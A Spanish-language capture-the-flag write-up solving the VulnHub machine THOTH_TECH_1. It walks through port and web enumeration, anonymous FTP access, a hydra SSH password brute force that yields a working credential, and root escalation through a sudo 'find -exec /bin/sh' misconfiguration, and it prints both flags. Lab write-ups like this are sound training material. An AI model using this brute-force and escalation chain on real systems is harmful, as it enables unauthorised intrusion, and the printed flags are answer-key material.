# Write Up THOTH\_TECH\_1 VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 14:02 EDT
Nmap scan report for 192.168.5.188
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             110 Jul 02  2021 note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ac:d2:7b:75:80:67:f2:9d:95:67:52:99:c8:2f:ab:7b (RSA)
|   256 78:ca:86:73:b6:87:06:08:eb:7a:9c:ab:cf:9d:89:16 (ECDSA)
|_  256 93:49:d7:8c:1c:07:7e:8e:79:91:2b:bf:2d:0d:34:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:2E:9A:C3 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

Vemos que hay un archivo dentro, por lo que nos lo descargamos...

```shell
get note.txt
```

Si leemos su contenido veriamos lo siguiente...

```
Dear pwnlab,

My name is jake. Your password is very weak and easily crackable, I think change your password.
```

### Gobuster

```shell
gobuster dir -u http://<IP> -w <WORDLIST> -x html,php,txt,md -t 50 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.188
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,md
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 7]
Progress: 102345 / 102350 (100.00%)
[ERROR] Get "http://192.168.5.188/wordpress/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
===============================================================
Finished
===============================================================
```

### nikto

```shell
nikto -h http://<IP>/
```

Info:

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.188
+ Target Hostname:    192.168.5.188
+ Target Port:        80
+ Start Time:         2024-06-14 14:10:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5c5d81ce6522e, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
+ RFC-1918 /wordpress/wp-admin/: IP address found in the 'location' header. The IP is "192.168.1.8". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /test.php: This might be interesting.
+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wordpress/wp-content/uploads/: Directory indexing found.
+ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wordpress/wp-login.php: Wordpress login found.
+ 8103 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2024-06-14 14:10:47 (GMT-4) (38 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nos saca que contiene un `wordpress` la pagina, pero sera poco interesante todo esto...

Anteriormente obtuvimos un nombre de usuario con una contraseña debil por lo que decia la nota, probaremos un `hydra` con el nombre de usuario `pwnlab`...

### hydra

```shell
hydra -l pwnlab -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-14 14:10:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.188:22/
[22][ssh] host: 192.168.5.188   login: pwnlab   password: babygirl1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-14 14:11:01
```

Por lo que vemos nos saca las credenciales del usuario...

```
User = pwnlab
Password = babygirl1
```

Por lo que nos conectaremos por `ssh`...

```shell
ssh pwnlab@<IP>
```

Una vez metida la contraseña y estando dentro del servidor con el usuario `pwnlab` haremos `sudo -l` y veremos lo siguiente...

```
Matching Defaults entries for pwnlab on thothtech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwnlab may run the following commands on thothtech:
    (root) NOPASSWD: /usr/bin/find
```

Podemos ejecutar el binario `find` como `root` por lo que haremos lo siguiente...

```shell
sudo find . -exec /bin/sh \; -quit
```

Una vez puesto ese comando ya seremos `root` por lo que leeremos las 2 flags que hay...

> user.txt (flag1) `/home/pwnlab/user.txt`

```
5ec2a44a73e7b259c6b0abc174291359
```

> root.txt (flag2) `/root/root.txt`

```
Root flag: d51546d5bcf8e3856c7bff5d201f0df6

good job :)
```
